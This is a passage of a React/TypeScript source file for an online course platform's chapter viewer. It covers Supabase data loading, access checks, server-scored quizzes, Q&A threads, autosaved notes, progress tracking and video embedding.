import { useEffect, useState, useCallback, useRef } from "react";
import { useParams, useNavigate, Link } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { useAuth } from "@/contexts/AuthContext";
import { Button } from "@/components/ui/button";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Textarea } from "@/components/ui/textarea";
import { toast } from "@/lib/toast";
import DOMPurify from "dompurify";
import {
  CheckCircle2,
  ChevronLeft,
  ChevronRight,
  Download,
  FileText,
  HelpCircle,
  Info,
  ArrowLeft,
  RotateCcw,
  Play,
  PenLine,
  Share2,
  ListVideo,
} from "lucide-react";
import VdoCipherPlayer from "@/components/VdoCipherPlayer";
import Confetti from "@/components/Confetti";
import { checkMilestone } from "@/hooks/useMilestone";
import { useVideoProgress } from "@/hooks/useVideoProgress";
import { checkAndGenerateCertificate } from "@/hooks/useCertificateAutoGenerate";
import { hapticImpact, hapticNotification } from "@/lib/haptics";

interface Chapter {
  id: string;
  title: string;
  description: string | null;
  content_type: string;
  media_url: string | null;
  embed_url: string | null;
  article_body: string | null;
  make_free: boolean;
  section_id: string;
  sort_order: number;
  duration_seconds: number | null;
}

interface Resource {
  id: string;
  filename: string;
  file_url: string;
  file_size_bytes: number | null;
}

interface QnaItem {
  id: string;
  question_text: string;
  user_id: string;
  is_resolved: boolean;
  created_at: string;
  user_name?: string;
  replies: QnaReply[];
}

interface QnaReply {
  id: string;
  reply_text: string;
  user_id: string;
  is_instructor_reply: boolean;
  created_at: string;
  user_name?: string;
}

/* ─── QuizBlock component ─── */
const QuizBlock = ({ quiz, userId }: { quiz: any; userId?: string }) => {
  const [answers, setAnswers] = useState<Record<string, string>>({});
  const [submitted, setSubmitted] = useState(false);
  const [result, setResult] = useState<{ score: number; total: number; passed: boolean } | null>(null);
  const [loadingAttempt, setLoadingAttempt] = useState(true);

  const questions: any[] = (quiz.quiz_questions || [])
    .sort((a: any, b: any) => a.sort_order - b.sort_order)
    .map((q: any) => ({
      ...q,
      quiz_options: (q.quiz_options || []).sort((a: any, b: any) => a.sort_order - b.sort_order),
    }));

  // Load previous attempt on mount. Column is `total`, not `total_questions`
  // — prior code referenced a non-existent column.
  useEffect(() => {
    if (!userId || !quiz.id) { setLoadingAttempt(false); return; }
    (async () => {
      const { data: attempt } = await (supabase as any)
        .from("quiz_attempts")
        .select("id, score, total, passed, answers")
        .eq("quiz_id", quiz.id)
        .eq("user_id", userId)
        .order("created_at", { ascending: false })
        .limit(1)
        .maybeSingle();
      if (attempt && attempt.passed) {
        // Pre-fill answers and show results
        if (attempt.answers && typeof attempt.answers === "object") {
          setAnswers(attempt.answers as Record<string, string>);
        }
        setResult({ score: attempt.score, total: attempt.total, passed: attempt.passed });
        setSubmitted(true);
      }
      setLoadingAttempt(false);
    })();
  }, [quiz.id, userId]);

  const answeredCount = Object.keys(answers).length;

  const handleSubmit = async () => {
    if (questions.length === 0) return;
    // Require at least one answer before submitting
    if (answeredCount === 0) {
      toast.error("Please answer at least one question before submitting.");
      return;
    }

    // Server-side scoring — the RPC verifies enrolment, reads is_correct
    // from the locked-down base table, and records the attempt in one
    // SECURITY DEFINER transaction. Client no longer sees the answer key.
    const { data, error } = await (supabase as any).rpc("submit_quiz", {
      p_quiz_id: quiz.id,
      p_answers: answers,
    });

    if (error || !data) {
      if (import.meta.env.DEV) console.error("[quiz] submit_quiz RPC failed:", error);
      toast.error("We couldn't submit your quiz. Please try again.");
      return;
    }

    const score: number = Number(data.score) || 0;
    const total: number = Number(data.total) || questions.length;
    const passed: boolean = !!data.passed;

    setResult({ score, total, passed });
    setSubmitted(true);

    if (passed) {
      hapticNotification("success");
      toast.success(`Passed! ${score}/${total} correct`);
    } else {
      toast.error(`Not quite — ${score}/${total}. You need ${quiz.pass_percentage}% to pass.`);
    }
  };

  const handleRetry = () => {
    setAnswers({});
    setSubmitted(false);
    setResult(null);
  };

  if (loadingAttempt) {
    return (
      <div className="bg-card border border-border rounded-xl p-6 animate-pulse">
        <div className="h-4 bg-surface-2 rounded w-1/3 mb-2" />
        <div className="h-3 bg-surface-2 rounded w-1/2" />
      </div>
    );
  }

  return (
    <div className="bg-card border border-border rounded-xl p-6 space-y-5">
      <div className="flex items-center justify-between">
        <div>
          <h4 className="font-semibold text-foreground">{quiz.title}</h4>
          {quiz.description && (
            <p className="text-sm text-muted-foreground mt-1">{quiz.description}</p>
          )}
        </div>
        {result && (
          <span
            className={`text-xs font-mono px-2.5 py-1 rounded-full ${
              result.passed
                ? "bg-emerald-500/15 text-emerald-400"
                : "bg-rose-500/15 text-rose-400"
            }`}
          >
            {result.passed ? "PASSED" : "FAILED"} — {result.score}/{result.total}
          </span>
        )}
      </div>

      <div className="space-y-4">
        {questions.map((q: any, qi: number) => {
          const selectedId = answers[q.id];
          const correctOptionId = q.quiz_options.find((o: any) => o.is_correct)?.id;
          const isCorrect = submitted && selectedId === correctOptionId;
          const isWrong = submitted && selectedId && selectedId !== correctOptionId;

          return (
            <div key={q.id} className="space-y-2">
              <p className="text-sm font-medium">
                <span className="text-muted-foreground mr-2">{qi + 1}.</span>
                {q.question_text}
              </p>
              <div className="space-y-1.5 pl-5">
                {q.quiz_options.map((o: any) => {
                  const isSelected = selectedId === o.id;
                  let optClass = "bg-surface hover:bg-surface-2";
                  if (submitted) {
                    if (o.is_correct) optClass = "bg-emerald-500/10 border-emerald-500/30";
                    else if (isSelected && !o.is_correct) optClass = "bg-rose-500/10 border-rose-500/30";
                    else optClass = "bg-surface opacity-60";
                  }

                  return (
                    <label
                      key={o.id}
                      className={`flex items-center gap-3 px-3 py-2 rounded-lg border border-border cursor-pointer transition-colors ${optClass}`}
                    >
                      <input
                        type="radio"
                        name={`quiz-q-${q.id}`}
                        value={o.id}
                        checked={isSelected}
                        disabled={submitted}
                        onChange={() => setAnswers((prev) => ({ ...prev, [q.id]: o.id }))}
                        className="accent-emerald-500"
                      />
                      <span className="text-sm">{o.option_text}</span>
                      {submitted && o.is_correct && (
                        <CheckCircle2 className="h-3.5 w-3.5 text-emerald-400 ml-auto" />
                      )}
                    </label>
                  );
                })}
              </div>
              {submitted && q.explanation && (
                <p className="text-xs text-muted-foreground bg-surface rounded-lg px-3 py-2 ml-5">
                  {q.explanation}
                </p>
              )}
            </div>
          );
        })}
      </div>

      <div className="flex gap-3 pt-2">
        {!submitted ? (
          <Button
            size="sm"
            onClick={handleSubmit}
            disabled={Object.keys(answers).length < questions.length}
          >
            Submit Quiz
          </Button>
        ) : (
          <Button size="sm" variant="outline" onClick={handleRetry}>
            <RotateCcw className="h-3.5 w-3.5 mr-1" /> Retry
          </Button>
        )}
      </div>
    </div>
  );
};

const ChapterViewer = () => {
  const { chapterId } = useParams<{ chapterId: string }>();
  const navigate = useNavigate();
  const { user, profile } = useAuth();

  const [chapter, setChapter] = useState<Chapter | null>(null);
  const [courseId, setCourseId] = useState<string | null>(null);
  const [courseTitle, setCourseTitle] = useState<string | null>(null);
  // The public offering slug for this chapter's course. Share links use
  // this so recipients land on the marketing/buy page (not on a paywalled
  // chapter URL that would bounce them straight to login).
  const [offeringSlug, setOfferingSlug] = useState<string | null>(null);
  const [siblings, setSiblings] = useState<{
    id: string;
    title: string;
    duration_seconds: number | null;
    content_type: string;
    thumbnail_url: string | null;
    vdocipher_thumbnail_url: string | null;
    description: string | null;
  }[]>([]);
  const [currentIndex, setCurrentIndex] = useState(0);
  const [isCompleted, setIsCompleted] = useState(false);
  const [resources, setResources] = useState<Resource[]>([]);
  const [qna, setQna] = useState<QnaItem[]>([]);
  const [questionText, setQuestionText] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [loading, setLoading] = useState(true);
  const [accessDenied, setAccessDenied] = useState(false);
  const [qnaLimit, setQnaLimit] = useState(20);
  const [notes, setNotes] = useState("");
  const [notesSavedAt, setNotesSavedAt] = useState<number | null>(null);
  const [milestone, setMilestone] = useState<{ pct: number; title: string; subtitle: string } | null>(null);
  const [showConfetti, setShowConfetti] = useState(false);
  const [showCompletionBanner, setShowCompletionBanner] = useState(false);
  const [quizzes, setQuizzes] = useState<any[]>([]);

  const confettiTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const autoAdvanceTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  const { updateProgress, lastPosition } = useVideoProgress(chapterId, courseId, user?.id);

  // Clean up confetti and auto-advance timers on unmount
  useEffect(() => {
    return () => {
      if (confettiTimerRef.current) clearTimeout(confettiTimerRef.current);
      if (autoAdvanceTimerRef.current) clearTimeout(autoAdvanceTimerRef.current);
    };
  }, []);

  // Lock body scroll when completion banner is shown
  useEffect(() => {
    if (showCompletionBanner) {
      const prev = document.body.style.overflow;
      document.body.style.overflow = "hidden";
      return () => {
        document.body.style.overflow = prev;
      };
    }
  }, [showCompletionBanner]);

  const loadChapter = useCallback(async () => {
    if (!chapterId || !user) return;
    setLoading(true);

    // Fetch chapter
    const { data: ch, error } = await supabase
      .from("chapters")
      .select("*")
      .eq("id", chapterId)
      .maybeSingle();

    if (error || !ch) {
      toast.error("Chapter not found");
      navigate("/home");
      return;
    }

    setChapter(ch as Chapter);

    // Get course_id from section
    const { data: sec } = await supabase
      .from("sections")
      .select("course_id")
      .eq("id", ch.section_id)
      .maybeSingle();

    const cid = sec?.course_id;
    setCourseId(cid || null);

    // Fetch course title for breadcrumb + the course's public offering
    // slug so the Share button can deep-link recipients to the buy page
    // instead of the gated chapter URL.
    if (cid) {
      const { data: courseData } = await supabase
        .from("courses")
        .select("title, primary_offering_id")
        .eq("id", cid)
        .maybeSingle();
      setCourseTitle(courseData?.title || null);

      // Prefer the course's primary offering. If that's unset, fall
      // through to any offering that lists this course - we just need
      // a working public landing page to share.
      let resolvedSlug: string | null = null;
      if (courseData?.primary_offering_id) {
        const { data: off } = await supabase
          .from("offerings")
          .select("slug")
          .eq("id", courseData.primary_offering_id)
          // Resolve slug for active OR archived offerings — legacy
          // enrolees on archived programs still need the "Back to
          // offering" link from inside ChapterViewer to work.
          .in("status", ["active", "archived"])
          .maybeSingle();
        resolvedSlug = off?.slug ?? null;
      }
      if (!resolvedSlug) {
        // Two-step lookup instead of a PostgREST embed - more robust
        // against FK ambiguity, and the offerings table has a tiny row
        // count so the extra round-trip is negligible.
        const { data: ocs } = await supabase
          .from("offering_courses")
          .select("offering_id")
          .eq("course_id", cid);
        const offeringIds = ((ocs ?? []) as any[])
          .map((r) => r.offering_id)
          .filter(Boolean);
        if (offeringIds.length > 0) {
          const { data: offs } = await supabase
            .from("offerings")
            .select("slug, is_public, status")
            .in("id", offeringIds)
            .in("status", ["active", "archived"]);
          // Prefer active offerings for the canonical back-link; fall
          // back to an archived one if this course only has archived
          // offerings (e.g. legacy TagMango program with no successor).
          const publicOnes = ((offs ?? []) as any[]).filter((o) => o.is_public !== false);
          const active = publicOnes.find((o) => o.status === "active");
          resolvedSlug = (active ?? publicOnes[0])?.slug ?? null;
        }
      }
      setOfferingSlug(resolvedSlug);
    }

    // Access check — if not free, verify access before rendering content
    if (!ch.make_free && cid) {
      const isAdmin = profile?.role === "admin";
      if (!isAdmin) {
        const { data: access } = await supabase.rpc("has_course_access", {
          p_course_id: cid,
        });
        if (!access) {
          setAccessDenied(true);
          setLoading(false);
          return;
        }
      }
    }
    setAccessDenied(false);

    // Load all chapter siblings in same course for nav
    if (cid) {
      const { data: allSections } = await supabase
        .from("sections")
        .select("id, sort_order")
        .eq("course_id", cid)
        .order("sort_order");

      if (allSections && allSections.length > 0) {
        const sectionIds = allSections.map((s) => s.id);
        const { data: allChapters } = await supabase
          .from("chapters")
          .select("id, title, section_id, sort_order, duration_seconds, content_type, thumbnail_url, vdocipher_thumbnail_url, description")
          .in("section_id", sectionIds)
          .order("sort_order");

        if (allChapters) {
          // Sort by section order then chapter order
          const sectionOrder = new Map(allSections.map((s, i) => [s.id, i]));
          const sorted = allChapters.sort((a, b) => {
            const sa = sectionOrder.get(a.section_id) ?? 0;
            const sb = sectionOrder.get(b.section_id) ?? 0;
            return sa !== sb ? sa - sb : a.sort_order - b.sort_order;
          });
          setSiblings(sorted.map((c) => ({
            id: c.id,
            title: c.title,
            duration_seconds: c.duration_seconds,
            content_type: c.content_type,
            thumbnail_url: c.thumbnail_url,
            vdocipher_thumbnail_url: (c as any).vdocipher_thumbnail_url ?? null,
            description: c.description,
          })));
          setCurrentIndex(sorted.findIndex((c) => c.id === chapterId));
        }
      }
    }

    // Load progress, resources, qna in parallel
    const [progressRes, resourcesRes, qnaRes] = await Promise.all([
      supabase
        .from("chapter_progress")
        .select("completed_at")
        .eq("chapter_id", chapterId)
        .eq("user_id", user.id)
        .maybeSingle(),
      supabase
        .from("chapter_resources")
        .select("id, filename, file_url, file_size_bytes")
        .eq("chapter_id", chapterId)
        .order("sort_order"),
      supabase
        .from("chapter_qna")
        .select("id, question_text, user_id, is_resolved, created_at")
        .eq("chapter_id", chapterId)
        .order("created_at", { ascending: false }),
    ]);

    setIsCompleted(!!progressRes.data?.completed_at);
    setResources((resourcesRes.data || []) as Resource[]);

    // Batch-fetch all QnA replies (fixes N+1 sequential query issue)
    const qnaItems = (qnaRes.data || []) as any[];
    const qnaIds = qnaItems.map((q) => q.id);
    let allReplies: any[] = [];
    if (qnaIds.length > 0) {
      const { data: repliesData } = await supabase
        .from("chapter_qna_replies")
        .select("id, reply_text, user_id, is_instructor_reply, created_at, qna_id")
        .in("qna_id", qnaIds)
        .order("created_at");
      allReplies = repliesData || [];
    }
    const repliesByQna: Record<string, QnaReply[]> = {};
    allReplies.forEach((r: any) => {
      if (!repliesByQna[r.qna_id]) repliesByQna[r.qna_id] = [];
      repliesByQna[r.qna_id].push(r);
    });

    // Batch-fetch user names for QnA and replies
    const allUserIds = new Set<string>();
    qnaItems.forEach((q: any) => allUserIds.add(q.user_id));
    allReplies.forEach((r: any) => allUserIds.add(r.user_id));
    let userNameMap: Record<string, string> = {};
    if (allUserIds.size > 0) {
      // public_user_profiles is the column-safe view introduced in
      // 20260417100000_foundation_hardening.sql. We use it instead of
      // querying the users table directly because users RLS only
      // exposes the caller's own row to non-admins; the view exposes
      // id/full_name/avatar_url/member_number/occupation for every
      // authenticated peer (no email/phone/bio/city).
      const { data: users } = await supabase
        .from("public_user_profiles" as any).select("id, full_name").in("id", [...allUserIds]);
      ((users as any[]) || []).forEach((u: any) => { userNameMap[u.id] = u.full_name || "Anonymous"; });
    }

    const qnaWithReplies: QnaItem[] = qnaItems.map((q) => ({
      ...q,
      user_name: userNameMap[q.user_id] || "Anonymous",
      replies: (repliesByQna[q.id] || []).map((r: any) => ({
        ...r,
        user_name: userNameMap[r.user_id] || "Anonymous",
      })),
    }));
    setQna(qnaWithReplies);

    // Fetch quizzes for this chapter. Options come from `quiz_options_public`
    // — a view that never exposes `is_correct`. Scoring moved to the
    // `submit_quiz` RPC (see migration 20260417120000) so students can no
    // longer read the answer key.
    const { data: quizData } = await (supabase as any)
      .from("chapter_quizzes")
      .select("id, title, description, pass_percentage, sort_order, quiz_questions(id, question_text, question_type, explanation, sort_order)")
      .eq("chapter_id", chapterId)
      .eq("is_active", true)
      .order("sort_order");

    if (quizData && quizData.length) {
      const allQuestionIds: string[] = quizData.flatMap((q: any) =>
        (q.quiz_questions || []).map((qq: any) => qq.id)
      );
      if (allQuestionIds.length) {
        const { data: opts } = await (supabase as any)
          .from("quiz_options_public")
          .select("id, question_id, option_text, sort_order")
          .in("question_id", allQuestionIds)
          .order("sort_order");
        const byQuestion: Record<string, any[]> = {};
        (opts || []).forEach((o: any) => {
          if (!byQuestion[o.question_id]) byQuestion[o.question_id] = [];
          byQuestion[o.question_id].push(o);
        });
        quizData.forEach((q: any) => {
          (q.quiz_questions || []).forEach((qq: any) => {
            qq.quiz_options = byQuestion[qq.id] || [];
          });
        });
      }
      setQuizzes(quizData);
    } else {
      setQuizzes([]);
    }

    setLoading(false);
  }, [chapterId, user, profile, navigate]);

  useEffect(() => {
    loadChapter();
  }, [loadChapter]);

  // Notes load - DB-backed via chapter_notes (one row per user per chapter).
  // On mount we read the DB row; if it doesn't exist but localStorage still
  // has a v1-era note for this chapter we upload it once and clear the
  // local copy so the two stores can't drift.
  const notesHydratedRef = useRef(false);
  useEffect(() => {
    if (!chapterId || !user) return;
    let cancelled = false;
    notesHydratedRef.current = false;
    (async () => {
      const { data } = await supabase
        .from("chapter_notes")
        .select("body")
        .eq("user_id", user.id)
        .eq("chapter_id", chapterId)
        .maybeSingle();
      if (cancelled) return;

      let initial = data?.body ?? "";
      // Legacy localStorage migration: if no DB row exists yet but a
      // v1 note is still in localStorage, push it to the DB and wipe
      // the local copy. Idempotent because subsequent loads see the
      // DB row and skip this branch.
      if (!data) {
        const legacyKey = `levelup:notes:${user.id}:${chapterId}`;
        let legacy: string | null = null;
        try { legacy = localStorage.getItem(legacyKey); } catch { /* ignored */ }
        if (legacy) {
          await supabase.from("chapter_notes").upsert(
            { user_id: user.id, chapter_id: chapterId, body: legacy },
            { onConflict: "user_id,chapter_id" }
          );
          try { localStorage.removeItem(legacyKey); } catch { /* ignored */ }
          initial = legacy;
        }
      }
      if (cancelled) return;
      setNotes(initial);
      setNotesSavedAt(null);
      // Hydration done - the autosave effect below can now persist user
      // edits without misreading the initial load as a user change.
      notesHydratedRef.current = true;
    })();
    return () => { cancelled = true; };
  }, [chapterId, user]);

  // Hold the live notes string in a ref so the unmount/chapter-switch
  // flush below can read the latest value without going stale on the
  // captured closure.
  const notesRef = useRef("");
  notesRef.current = notes;

  // Debounced autosave - upserts the (user_id, chapter_id) row whenever
  // the textarea content changes after hydration completes.
  useEffect(() => {
    if (!chapterId || !user) return;
    if (!notesHydratedRef.current) return;
    const t = setTimeout(async () => {
      try {
        if (notes) {
          const { error } = await supabase.from("chapter_notes").upsert(
            { user_id: user.id, chapter_id: chapterId, body: notes },
            { onConflict: "user_id,chapter_id" }
          );
          if (!error) setNotesSavedAt(Date.now());
        } else {
          // Empty textarea - delete the row so the DB doesn't keep
          // empty notes hanging around. Only signal "Saved" if there
          // was actually a row to delete.
          const { error, count } = await supabase
            .from("chapter_notes")
            .delete({ count: "exact" })
            .eq("user_id", user.id)
            .eq("chapter_id", chapterId);
          if (!error && (count ?? 0) > 0) setNotesSavedAt(Date.now());
        }
      } catch {
        // Offline or network blip - notes stay in component state
        // and we'll retry on the next change. We deliberately don't
        // toast every save failure; the user sees the absence of
        // the "Saved" tag instead.
      }
    }, 600);
    return () => clearTimeout(t);
  }, [notes, chapterId, user]);

  // Flush on unmount or chapter switch. The debounced effect above
  // clears its timer on cleanup, which means the last ~600ms of
  // typing would be lost when the user navigates away mid-edit.
  // This effect fires a fire-and-forget save with the latest value
  // from the ref so nothing gets clipped. We don't need to set
  // notesSavedAt here - the component is gone.
  useEffect(() => {
    return () => {
      if (!notesHydratedRef.current) return;
      if (!chapterId || !user) return;
      const finalNotes = notesRef.current;
      if (finalNotes) {
        void supabase.from("chapter_notes").upsert(
          { user_id: user.id, chapter_id: chapterId, body: finalNotes },
          { onConflict: "user_id,chapter_id" }
        );
      } else {
        void supabase
          .from("chapter_notes")
          .delete()
          .eq("user_id", user.id)
          .eq("chapter_id", chapterId);
      }
    };
  }, [chapterId, user]);

  // Lightweight refresh for Q&A only — used after posting a question so we don't
  // unmount the whole page (which would flash the loader and reset the Tabs back
  // to Overview — especially disruptive on mobile).
  const refreshQna = useCallback(async () => {
    if (!chapterId) return;
    const { data: qnaData } = await supabase
      .from("chapter_qna")
      .select("id, question_text, user_id, is_resolved, created_at")
      .eq("chapter_id", chapterId)
      .order("created_at", { ascending: false });
    const qnaItems = (qnaData || []) as any[];
    const qnaIds = qnaItems.map((q) => q.id);
    let allReplies: any[] = [];
    if (qnaIds.length > 0) {
      const { data: repliesData } = await supabase
        .from("chapter_qna_replies")
        .select("id, reply_text, user_id, is_instructor_reply, created_at, qna_id")
        .in("qna_id", qnaIds)
        .order("created_at");
      allReplies = repliesData || [];
    }
    const repliesByQna: Record<string, QnaReply[]> = {};
    allReplies.forEach((r: any) => {
      if (!repliesByQna[r.qna_id]) repliesByQna[r.qna_id] = [];
      repliesByQna[r.qna_id].push(r);
    });
    const userIds = new Set<string>();
    qnaItems.forEach((q: any) => userIds.add(q.user_id));
    allReplies.forEach((r: any) => userIds.add(r.user_id));
    const userNameMap: Record<string, string> = {};
    if (userIds.size > 0) {
      const { data: users } = await supabase
        .from("users").select("id, full_name").in("id", [...userIds]);
      (users || []).forEach((u) => { userNameMap[u.id] = u.full_name || "Anonymous"; });
    }
    setQna(qnaItems.map((q) => ({
      ...q,
      user_name: userNameMap[q.user_id] || "Anonymous",
      replies: (repliesByQna[q.id] || []).map((r: any) => ({
        ...r,
        user_name: userNameMap[r.user_id] || "Anonymous",
      })),
    })));
  }, [chapterId]);

  // Listen for YouTube / Vimeo / generic iframe progress messages
  useEffect(() => {
    const handler = (event: MessageEvent) => {
      try {
        const data = typeof event.data === "string" ? JSON.parse(event.data) : event.data;

        // YouTube IFrame API sends infoDelivery with playerState and currentTime
        if (data?.event === "infoDelivery" && data?.info?.currentTime !== undefined) {
          updateProgress(
            Math.floor(data.info.currentTime),
            Math.floor(data.info.duration || 0)
          );
          return;
        }

        // Vimeo player.js sends events with method "timeupdate"
        if (data?.method === "timeupdate" && data?.value?.seconds !== undefined) {
          updateProgress(
            Math.floor(data.value.seconds),
            Math.floor(data.value.duration || 0)
          );
          return;
        }

        // Generic fallback: any message with currentTime
        if (data?.currentTime !== undefined) {
          updateProgress(
            Math.floor(data.currentTime),
            Math.floor(data.duration || 0)
          );
        }
      } catch {
        // ignore non-JSON messages
      }
    };
    window.addEventListener("message", handler);
    return () => window.removeEventListener("message", handler);
  }, [updateProgress]);

  const handleShare = async () => {
    if (!chapter) return;
    // Share the offering's public buy page when we have it - recipients
    // without access can read about the program and purchase, then
    // start watching. Only fall back to the chapter URL if no public
    // offering links to this course (an unlikely but defensive case).
    const url = offeringSlug
      ? `${window.location.origin}/p/${offeringSlug}`
      : window.location.href;
    const title = courseTitle || chapter.title;
    if (typeof navigator !== "undefined" && (navigator as any).share) {
      try {
        await (navigator as any).share({ url, title });
        return;
      } catch {
        // User cancelled, or share unavailable — fall through to clipboard.
      }
    }
    try {
      await navigator.clipboard.writeText(url);
      toast.success("Link copied");
    } catch {
      toast.error("Could not copy link");
    }
  };

  const handleMarkComplete = async () => {
    if (!user || !chapterId || !courseId) return;
    setSubmitting(true);

    const { error } = await supabase.from("chapter_progress").upsert(
      {
        user_id: user.id,
        chapter_id: chapterId,
        course_id: courseId,
        completed_at: new Date().toISOString(),
        started_at: new Date().toISOString(),
      },
      { onConflict: "user_id,chapter_id" }
    );

    if (error) {
      // Fallback: insert if upsert fails (no unique constraint)
      await supabase.from("chapter_progress").insert({
        user_id: user.id,
        chapter_id: chapterId,
        course_id: courseId,
        completed_at: new Date().toISOString(),
        started_at: new Date().toISOString(),
      });
    }

    setIsCompleted(true);
    setSubmitting(false);
    hapticImpact("light");

    // Check for milestone (progress celebration)
    const { data: allProgress } = await supabase
      .from("chapter_progress")
      .select("chapter_id, completed_at")
      .eq("user_id", user.id)
      .eq("course_id", courseId);
    const completedCount = (allProgress || []).filter((p) => p.completed_at).length;
    const totalCount = siblings.length || 1;
    // completedBefore = completedCount - 1 (we just completed one)
    const hit = checkMilestone(completedCount - 1, completedCount, totalCount);

    if (hit) {
      setShowConfetti(true);
      setMilestone(hit);
      hapticNotification("success");
      toast.success(hit.title, { description: hit.subtitle, duration: 4000 });
      confettiTimerRef.current = setTimeout(() => { setShowConfetti(false); setMilestone(null); }, 4000);
    } else {
      toast.success("Nice work! Chapter done.");
    }

    // Auto-generate certificate if threshold reached
    checkAndGenerateCertificate(
      user.id,
      courseId,
      completedCount,
      totalCount,
      profile?.full_name ?? "Student",
      profile?.member_number ?? null
    ).then((cert) => {
      if (cert) {
        toast.success("Certificate earned!", {
          description: `Certificate ${cert.certificateNumber} has been generated.`,
          duration: 6000,
        });
      }
    });

    // If this was the last chapter, show the course completion banner
    if (currentIndex === siblings.length - 1) {
      setShowCompletionBanner(true);
      return;
    }

    // Auto-advance to next (with safety check) — delay longer if milestone shown
    const advanceDelay = hit ? 2500 : 800;
    if (siblings && currentIndex >= 0 && currentIndex < siblings.length - 1 && siblings[currentIndex + 1]?.id) {
      autoAdvanceTimerRef.current = setTimeout(() => {
        hapticImpact("light");
        navigate(`/chapters/${siblings[currentIndex + 1].id}`);
      }, advanceDelay);
    }
  };

  const handlePostQuestion = async () => {
    if (!questionText.trim() || !user || !chapterId) return;
    setSubmitting(true);
    const { error } = await supabase.from("chapter_qna").insert({
      chapter_id: chapterId,
      user_id: user.id,
      question_text: questionText.trim(),
    });
    if (error) toast.error("Failed to post question");
    else {
      toast.success("Question sent — your instructor will see it.");
      setQuestionText("");
      refreshQna();
    }
    setSubmitting(false);
  };

  if (loading) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-background">
        <div className="h-8 w-8 animate-spin rounded-full border-2 border-muted-foreground border-t-foreground" />
      </div>
    );
  }

  if (accessDenied) {
    return (
      <div className="flex flex-col items-center justify-center min-h-screen bg-background text-center px-4">
        <div className="w-16 h-16 rounded-full bg-surface-2 flex items-center justify-center mb-4">
          <Info className="h-8 w-8 text-muted-foreground" />
        </div>
        <h2 className="text-xl font-semibold mb-2">Enrolment required</h2>
        <p className="text-muted-foreground mb-6 max-w-md">
          You need to enrol in this course to access this chapter.
        </p>
        <div className="flex gap-3">
          <Button variant="outline" onClick={() => navigate("/my-courses")}>
            My Courses
          </Button>
          <Button onClick={() => navigate(courseId ? `/courses/${courseId}` : "/browse")}>
            View Course
          </Button>
        </div>
      </div>
    );
  }

  if (!chapter) return null;

  return (
    <div className="min-h-screen bg-background text-foreground pb-[env(safe-area-inset-bottom)]">
      <Confetti active={showConfetti} />
      {milestone && (
        <div className="fixed top-20 left-1/2 -translate-x-1/2 z-[9998] milestone-banner">
          <div className="bg-card border border-border rounded-2xl px-4 sm:px-6 py-4 shadow-2xl text-center max-w-[calc(100vw-2rem)] sm:max-w-sm">
            <p className="text-lg font-semibold">{milestone.title}</p>
            <p className="text-sm text-muted-foreground mt-1">{milestone.subtitle}</p>
            <div className="mt-2 h-1.5 bg-surface-2 rounded-full overflow-hidden">
              <div className="h-full bg-[hsl(var(--cream))] rounded-full transition-all duration-700" style={{ width: `${milestone.pct}%` }} />
            </div>
          </div>
        </div>
      )}
      {/* Course completion banner */}
      {showCompletionBanner && (
        <div className="fixed inset-0 z-[9999] flex items-center justify-center bg-black/60 backdrop-blur-sm">
          <div className="bg-card border border-border rounded-2xl px-5 sm:px-8 py-6 sm:py-8 shadow-2xl text-center max-w-sm sm:max-w-md mx-4">
            <div className="text-5xl mb-4">🎉</div>
            <h2 className="text-xl font-bold text-foreground">
              You've completed {courseTitle || "this course"}!
            </h2>
            <p className="text-muted-foreground mt-2">
              Ready for the next step?
            </p>
            <div className="flex flex-col gap-3 mt-6">
              <Button onClick={() => navigate("/browse")} size="lg" className="w-full">
                Browse More Courses
              </Button>
              <Button
                variant="outline"
                size="sm"
                onClick={() => setShowCompletionBanner(false)}
                className="w-full"
              >
                Stay Here
              </Button>
            </div>
          </div>
        </div>
      )}

      {/* Top bar */}
      <div className="sticky top-0 z-30 bg-card/80 backdrop-blur-xl border-b border-border px-4 flex items-center gap-3 h-[calc(3.5rem+env(safe-area-inset-top))] pt-[env(safe-area-inset-top)]">
        <Button
          variant="ghost"
          size="sm"
          onClick={() => navigate(courseId ? `/courses/${courseId}` : "/home")}
        >
          <ArrowLeft className="h-4 w-4 mr-1" /> Back to course
        </Button>
        <span className="text-sm text-muted-foreground truncate flex-1">
          {chapter.title}
        </span>
        {isCompleted && (
          <span className="flex items-center gap-1 text-xs text-emerald-500">
            <CheckCircle2 className="h-3.5 w-3.5" /> Completed
          </span>
        )}
      </div>

      <div className="flex flex-col lg:flex-row pb-[env(safe-area-inset-bottom)]">
        {/* Main content - no fixed max-w so the player fills wide
            viewports (16-inch+, ultra-wide). Text blocks have their own
            per-element max-w to keep line lengths comfortable. */}
        <div className="flex-1 min-w-0 p-4 lg:p-8 xl:p-10 2xl:p-12 space-y-6">
          {/* Breadcrumb — hidden on mobile since top bar has back + title */}
          <div className="hidden sm:flex items-center gap-1.5 text-sm text-muted-foreground mb-4 flex-wrap">
            <Link to="/my-courses" className="hover:text-foreground transition-colors">My Courses</Link>
            <span>&rsaquo;</span>
            {courseId && courseTitle && (
              <>
                <Link to={`/courses/${courseId}`} className="hover:text-foreground transition-colors truncate">{courseTitle}</Link>
                <span>&rsaquo;</span>
              </>
            )}
            <span className="text-foreground truncate">{chapter.title}</span>
          </div>
          {/* Content renderer.
              All non-VdoCipher players get a borderless, slightly elevated
              shell - dropping the visible border in favour of a soft shadow
              reads as more premium and matches the offering page's
              cinematic feel. */}
          {chapter.content_type === "video" && (chapter as any).video_type === "vdocipher" && (chapter as any).vdocipher_video_id ? (
            <div className="rounded-[16px] overflow-hidden shadow-[0_8px_24px_-12px_rgba(0,0,0,0.45)] ring-1 ring-white/5">
              <VdoCipherPlayer chapterId={chapter.id} onProgress={updateProgress} startPosition={lastPosition} />
            </div>
          ) : chapter.content_type === "video" && (chapter.media_url || chapter.embed_url) ? (
            <div className="aspect-video bg-card rounded-[16px] overflow-hidden shadow-[0_8px_24px_-12px_rgba(0,0,0,0.45)] ring-1 ring-white/5">
              <iframe
                src={(() => {
                  const url = chapter.embed_url || chapter.media_url || "";
                  const vimeoMatch = url.match(/vimeo\.com\/(\d+)/);
                  if (vimeoMatch) return `https://player.vimeo.com/video/${vimeoMatch[1]}?autoplay=0&title=0&byline=0&portrait=0`;
